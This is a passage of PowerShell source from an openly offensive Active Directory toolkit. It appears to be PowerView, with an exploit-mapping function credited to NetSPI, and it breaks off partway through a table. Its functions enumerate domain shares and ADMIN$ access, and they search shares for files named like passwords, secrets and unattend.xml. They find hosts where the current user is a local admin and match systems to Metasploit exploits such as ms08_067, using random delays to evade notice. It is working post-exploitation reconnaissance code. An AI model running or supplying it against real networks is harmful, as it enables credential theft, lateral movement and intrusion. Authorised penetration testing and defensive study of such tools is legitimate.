                throw "No hosts found!"
            }
        }

        # script block that enumerates a server
        $HostEnumBlock = {
            param($Server, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)

            # optionally check if the server is up first
            $Up = $True
            if($Ping) {
                $Up = Test-Server -Server $Server
            }
            if($Up) {
                # get the shares for this host and check what we find
                $Shares = Get-NetShare -HostName $Server
                ForEach ($Share in $Shares) {
                    Write-Debug "[*] Server share: $Share"
                    $NetName = $Share.shi1_netname
                    $Remark = $Share.shi1_remark
                    $Path = '\\'+$Server+'\'+$NetName

                    # make sure we get a real share name back
                    if (($NetName) -and ($NetName.trim() -ne '')) {
                        # if we're just checking for access to ADMIN$
                        if($CheckAdmin) {
                            if($NetName.ToUpper() -eq "ADMIN$") {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$Server\$NetName `t- $Remark"
                                }
                                catch {
                                    Write-Debug "Error accessing path $Path : $_"
                                }
                            }
                        }
                        # skip this share if it's in the exclude list
                        elseif ($ExcludedShares -NotContains $NetName.ToUpper()) {
                            # see if we want to check access to this share
                            if($CheckShareAccess) {
                                # check if the user has access to this path
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$Server\$NetName `t- $Remark"
                                }
                                catch {
                                    Write-Debug "Error accessing path $Path : $_"
                                }
                            }
                            else {
                                "\\$Server\$NetName `t- $Remark"
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'CheckShareAccess' = $CheckShareAccess
                'ExcludedShares' = $ExcludedShares
                'CheckAdmin' = $CheckAdmin
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -Hosts $Hosts -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($Hosts.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($Server) if(Test-Connection -ComputerName $Server -Count 1 -Quiet -ErrorAction Stop){$Server}}
                $Hosts = Invoke-ThreadedFunction -NoImports -Hosts $Hosts -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($Hosts.count)"
            $Counter = 0

            ForEach ($Server in $Hosts) {

                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Server ($Counter of $($Hosts.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Server, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
            }
        }
        
    }
}


function Invoke-FileFinder {
<#
    .SYNOPSIS

        Finds sensitive files on the domain.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.

    .PARAMETER Hosts

        Host array to enumerate, passable on the pipeline.

    .PARAMETER HostList

        List of hostnames/IPs to search.

    .PARAMETER HostFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER HostADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ShareList

        List if \\HOST\shares to search through.

    .PARAMETER Terms

        Terms to search for.

    .PARAMETER OfficeDocs

        Search for office documents (*.doc*, *.xls*, *.ppt*)

    .PARAMETER FreshEXEs

        Find .EXEs accessed within the last week.

    .PARAMETER AccessDateLimit

        Only return files with a LastAccessTime greater than this date value.

    .PARAMETER WriteDateLimit

        Only return files with a LastWriteTime greater than this date value.

    .PARAMETER CreateDateLimit

        Only return files with a CreationDate greater than this date value.

    .PARAMETER IncludeC

        Include any C$ shares in recursive searching (default ignore).

    .PARAMETER IncludeAdmin

        Include any ADMIN$ shares in recursive searching (default ignore).

    .PARAMETER ExcludeFolders

        Exclude folders from the search results.

    .PARAMETER ExcludeHidden

        Exclude hidden files and folders from the search results.

    .PARAMETER CheckWriteAccess

        Only returns files the current user has write access to.

    .PARAMETER OutFile

        Output results to a specified csv output file.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-FileFinder

        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

    .EXAMPLE

        PS C:\> Invoke-FileFinder -Domain testing

        Find readable files on the 'testing' domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

    .EXAMPLE

        PS C:\> Invoke-FileFinder -IncludeC

        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login' or 'unattend*.xml' in the name,
        including C$ shares.

    .EXAMPLE

        PS C:\> Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv

        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name, and write everything to "out.csv"

    .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/

#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [String]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String[]]
        $Terms,

        [String]
        $TermList,

        [String]
        $AccessDateLimit = '1/1/1970',

        [String]
        $WriteDateLimit = '1/1/1970',

        [String]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-FileFinder with delay of $Delay"

        $Shares = @()
        $Terms = @()

        # figure out the shares we want to ignore
        [String[]] $ExcludedShares = @("C$", "ADMIN$")

        # see if we're specifically including any of the normally excluded sets
        if ($IncludeC) {
            if ($IncludeAdmin) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @("ADMIN$")
            }
        }

        if ($IncludeAdmin) {
            if ($IncludeC) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @("C$")
            }
        }

        # delete any existing output file if it already exists
        If ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }

        # if there's a set of terms specified to search for
        if ($TermList) {
            if (Test-Path -Path $TermList) {
                ForEach ($Term in Get-Content -Path $TermList) {
                    if (($Term -ne $Null) -and ($Term.trim() -ne '')) {
                        $Terms += $Term
                    }
                }
            }
            else {
                throw "[!] Input file '$TermList' doesn't exist!"
            }
        }

        # if we're hard-passed a set of shares
        if($ShareList) {
            if (Test-Path -Path $ShareList) {
                ForEach ($Item in Get-Content -Path $ShareList) {
                    if (($Item -ne $Null) -and ($Item.trim() -ne '')) {
                        # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                        $Share = $Item.Split("`t")[0]
                        $Shares += $Share
                    }
                }
            }
            else {
                throw "[!] Input file '$ShareList' doesn't exist!"
            }
        }
        else {

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                # get ALL the domains in the forest to search
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                # use the local domain
                $TargetDomains = @( (Get-NetDomain).name )
            }

            if(!$Hosts) { 
                # if we're using a host list, read the targets in and add them to the target list
                if($HostList) {
                    if (Test-Path -Path $HostList) {
                        $Hosts = Get-Content -Path $HostList
                    }
                    else {
                        throw "[!] Input file '$HostList' doesn't exist!"
                    }
                }
                else {
                    ForEach ($Domain in $TargetDomains) {
                        Write-Verbose "[*] Querying domain $Domain for hosts"
                        $Hosts = Get-NetComputer -Domain $Domain -Filter $HostFilter -ADSpath $HostADSpath
                    }
                }

                # remove any null target hosts, uniquify the list and shuffle it
                $Hosts = $Hosts | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
                $HostCount = $Hosts.Count
                if($HostCount -eq 0) {
                    throw "No hosts found!"
                }
            }
        }

        # script block that enumerates shares and files on a server
        $HostEnumBlock = {
            param($Server, $Ping, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile)

            if($Server.StartsWith("\\")) {
                # if a share is passed as the server
                $SearchShares = @($Share)
            }
            else {
                # if we're enumerating the shares on the target server first
                $SearchShares = @()
                # optionally check if the server is up first
                $Up = $True
                if($Ping) {
                    $Up = Test-Server -Server $Server
                }
                if($Up) {
                    # get the shares for this host and display what we find
                    $Shares = Get-NetShare -HostName $Server
                    ForEach ($Share in $Shares) {

                        $NetName = $Share.shi1_netname
                        $Path = '\\'+$Server+'\'+$NetName

                        # make sure we get a real share name back
                        if (($NetName) -and ($NetName.trim() -ne '')) {

                            # skip this share if it's in the exclude list
                            if ($ExcludedShares -NotContains $NetName.ToUpper()) {
                                # check if the user has access to this path
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $SearchShares += $Path
                                }
                                catch {
                                    Write-Debug "[!] No access to $Path"
                                }
                            }
                        }
                    }
                }
                ForEach($Share in $SearchShares) {
                    $Cmd = "Invoke-FileSearch -Path $Share $(if($Terms) {`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders) {`"-ExcludeFolders`"}) $(if($OfficeDocs) {`"-OfficeDocs`"}) $(if($ExcludeHidden) {`"-ExcludeHidden`"}) $(if($FreshEXEs) {`"-FreshEXEs`"}) $(if($CheckWriteAccess) {`"-CheckWriteAccess`"}) $(if($OutFile) {`"-OutFile $OutFile`"})"
                    Invoke-Expression $Cmd
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ExcludedShares' = $ExcludedShares
                'Terms' = $Terms
                'ExcludeFolders' = $ExcludeFolders
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'OutFile' = $OutFile
            }

            # kick off the threaded script block + arguments 
            if($Shares) {
                # pass the shares as the hosts so the threaded function code doesn't have to be hacked up
                Invoke-ThreadedFunction -Hosts $Shares -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }
            else {
                Invoke-ThreadedFunction -Hosts $Hosts -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }        
        }

        else {
            if(-not $NoPing -and ($Hosts.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($Server) if(Test-Connection -ComputerName $Server -Count 1 -Quiet -ErrorAction Stop){$Server}}
                $Hosts = Invoke-ThreadedFunction -NoImports -Hosts $Hosts -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($Hosts.count)"
            $Counter = 0

            ForEach ($Server in $Hosts) {

                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Server ($Counter of $($Hosts.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Server, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile
            }
        }
    }
}


function Find-LocalAdminAccess {
<#
    .SYNOPSIS

        Finds machines on the local domain where the current user has
        local administrator access. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

    .PARAMETER Hosts

        Host array to enumerate, passable on the pipeline.

    .PARAMETER HostList

        List of hostnames/IPs to search.

    .PARAMETER HostFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER HostADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess

        Find machines on the local domain where the current user has local
        administrator access.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess -Threads 10

        Multi-threaded access hunting, replaces Find-LocalAdminAccessThreaded.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess -Domain testing

        Find machines on the 'testing' domain where the current user has
        local administrator access.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess -HostList hosts.txt

        Find which machines in the host list the current user has local
        administrator access.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Find-LocalAdminAccess with delay of $Delay"

        if(!$Hosts) {

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                # get ALL the domains in the forest to search
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                # use the local domain
                $TargetDomains = @( (Get-NetDomain).name )
            }

            # if we're using a host list, read the targets in and add them to the target list
            if($HostList) {
                if (Test-Path -Path $HostList) {
                    $Hosts = Get-Content -Path $HostList
                }
                else {
                    throw "[!] Input file '$HostList' doesn't exist!"
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"
                    $Hosts = Get-NetComputer -Domain $Domain -Filter $HostFilter -ADSpath $HostADSpath
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $Hosts = $Hosts | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            $HostCount = $Hosts.Count
            if($HostCount -eq 0) {
                throw "No hosts found!"
            }
        }

        # script block that enumerates a server
        $HostEnumBlock = {
            param($Server, $Ping)

            $Up = $True
            if($Ping) {
                $Up = Test-Server -Server $Server
            }
            if($Up) {
                # check if the current user has local admin access to this server
                $Access = Invoke-CheckLocalAdminAccess -HostName $Server
                if ($Access) {
                    $Server
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -Hosts $Hosts -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($Hosts.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($Server) if(Test-Connection -ComputerName $Server -Count 1 -Quiet -ErrorAction Stop){$Server}}
                $Hosts = Invoke-ThreadedFunction -NoImports -Hosts $Hosts -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($Hosts.count)"
            $Counter = 0

            ForEach ($Server in $Hosts) {

                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Server ($Counter of $($Hosts.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Server, $False
            }
        }
    }
}


function Get-ExploitableSystem
{
<#
    .Synopsis

        This module will query Active Directory for the hostname, OS version, and service pack level  
        for each computer account.  That information is then cross-referenced against a list of common
        Metasploit exploits that can be used during penetration testing.

    .DESCRIPTION

        This module will query Active Directory for the hostname, OS version, and service pack level  
        for each computer account.  That information is then cross-referenced against a list of common
        Metasploit exploits that can be used during penetration testing.  The script filters out disabled
        domain computers and provides the computer's last logon time to help determine if it's been 
        decommissioned.  Also, since the script uses data tables to output affected systems the results
        can be easily piped to other commands such as test-connection or a Export-Csv.

    .EXAMPLE
       
        The example below shows the standard command usage.  Disabled system are excluded by default, but
        the "LastLgon" column can be used to determine which systems are live.  Usually, if a system hasn't 
        logged on for two or more weeks it's been decommissioned.      
        PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Format-Table -AutoSize
        [*] Grabbing computer accounts from Active Directory...
        [*] Loading exploit list for critical missing patches...
        [*] Checking computers for vulnerable OS and SP levels...
        [+] Found 5 potentially vulnerabile systems!
        ComputerName          OperatingSystem         ServicePack    LastLogon            MsfModule                                      CVE                      
        ------------          ---------------         -----------    ---------            ---------                                      ---                      
        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....                     

    .EXAMPLE

        PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Export-Csv c:\temp\output.csv -NoTypeInformation

        How to write the output to a csv file.

    .EXAMPLE

        PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Test-Connection

        Shows how to pipe the resultant list of computer names into the test-connection to determine if they response to ping

     .LINK
       
       http://www.netspi.com
       https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1
       
     .NOTES
       
       Author: Scott Sutherland - 2015, NetSPI
       Version: Get-ExploitableSystem.psm1 v1.0
       Comments: The technique used to query LDAP was based on the "Get-AuditDSComputerAccount" 
       function found in Carols Perez's PoshSec-Mod project.  The general idea is based off of  
       Will Schroeder's "Invoke-FindVulnSystems" function from the PowerView toolkit.
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$False,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [String]$DomainController,

        [Parameter(Mandatory=$False,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [Int]$Limit = 1000,

        [Parameter(Mandatory=$False,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [String]$SearchScope = "Subtree",

        [Parameter(Mandatory=$False,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [String]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $ObjDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $ObjSearcher = New-Object System.DirectoryServices.DirectorySearcher $ObjDomain
        }
        else
        {
            $ObjDomain = [ADSI]""  
            $ObjSearcher = New-Object System.DirectoryServices.DirectorySearcher $ObjDomain
        }
    }

    Process
    {
        # Status user
        Write-Verbose "[*] Grabbing computer accounts from Active Directory..."

        # Create data table for hostnames, os, and service packs from LDAP
        $TableAdsComputers = New-Object System.Data.DataTable 
        $Null = $TableAdsComputers.Columns.Add('Hostname')       
        $Null = $TableAdsComputers.Columns.Add('OperatingSystem')
        $Null = $TableAdsComputers.Columns.Add('ServicePack')
        $Null = $TableAdsComputers.Columns.Add('LastLogon')

        # ----------------------------------------------------------------
        # Grab computer account information from Active Directory via LDAP
        # ----------------------------------------------------------------
        $CompFilter = "(&(objectCategory=Computer))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $ObjSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
        }

        $ObjSearcher.FindAll() | ForEach-Object {

            # Setup fields
            $CurrentHost = $($_.properties['dnshostname'])
            $CurrentOs = $($_.properties['operatingsystem'])
            $CurrentSp = $($_.properties['operatingsystemservicepack'])
            $CurrentLast = $($_.properties['lastlogon'])
            $CurrentUac = $($_.properties['useraccountcontrol'])

            # Convert useraccountcontrol to binary so flags can be checked
            # http://support.microsoft.com/en-us/kb/305144
            # http://blogs.technet.com/b/askpfeplat/archive/2014/01/15/understanding-the-useraccountcontrol-attribute-in-active-directory.aspx
            $CurrentUacBin = [convert]::ToString($CurrentUac,2)

            # Check the 2nd to last value to determine if its disabled
            $DisableOffset = $CurrentUacBin.Length - 2
            $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

            # Add computer to list if it's enabled
            if ($CurrentDisabled  -eq 0) {
                # Add domain computer to data table
                $Null = $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast)
            }            

         }

        # Status user        
        Write-Verbose "[*] Loading exploit list for critical missing patches..."

        # ----------------------------------------------------------------
        # Setup data table for list of msf exploits
        # ----------------------------------------------------------------
    
        # Create data table for list of patches levels with a MSF exploit
        $TableExploits = New-Object System.Data.DataTable 
        $Null = $TableExploits.Columns.Add('OperatingSystem') 
        $Null = $TableExploits.Columns.Add('ServicePack')
        $Null = $TableExploits.Columns.Add('MsfModule')  
        $Null = $TableExploits.Columns.Add('CVE')
        
        # Add exploits to data table
        $Null = $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
        $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
